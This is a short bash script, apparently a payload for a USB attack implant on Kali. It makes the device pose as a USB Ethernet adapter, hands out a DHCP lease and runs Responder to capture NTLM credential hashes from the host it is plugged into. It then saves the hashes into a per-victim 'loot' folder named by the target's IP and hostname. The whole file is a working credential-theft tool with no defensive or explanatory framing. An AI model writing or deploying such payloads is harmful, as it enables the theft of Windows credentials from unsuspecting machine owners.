#!/usr/bin/bash

RESPONDER_OPTIONS="-P -v"
LOOTDIR=/root/loot/quickcreds
LED_STATUS_PATH=/home/kali/tools/gpio/status/LED_STATUS
TOOL_DIR=/home/kali/tools/Responder
TOOL_LOG_DIR=/home/kali/tools/Responder/logs


echo "ATTACK" > $LED_STATUS_PATH

ATTACKMODE RNDIS_ETHERNET
sleep 2
udhcpd

cd $TOOL_DIR
rm logs/*

procname=responder_runtime_; (exec -a $procname python3 Responder.py -I usb0 $RESPONDER_OPTIONS )&

#python3 Responder.py -I usb0 $RESPONDER_OPTIONS &

until [ -f logs/*NTLM* ]
do
  sleep 0.1
done


GET_TARGET_IP=$(dumpleases  -f /var/lib/misc/udhcpd.leases | tail -n 1 | sed 's/\s\+/ /g' | cut -d ' ' -f 2)
GET_TARGET_HOSTNAME=$(dumpleases  -f /var/lib/misc/udhcpd.leases | tail -n 1 | sed 's/\s\+/ /g' | cut -d ' ' -f 3)

if [ -z "${GET_TARGET_IP}" ]; then
    echo "ERROR" > $LED_STATUS_PATH
        exit 1
fi

COUNT=$(ls -lad $LOOTDIR/$GET_TARGET_IP-$GET_TARGET_HOSTNAME* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$GET_TARGET_IP-$GET_TARGET_HOSTNAME-$COUNT

cp logs/* $LOOTDIR/$GET_TARGET_IP-$GET_TARGET_HOSTNAME-$COUNT

sync

pkill -f responder_runtime_


echo "FINISH" > $LED_STATUS_PATH
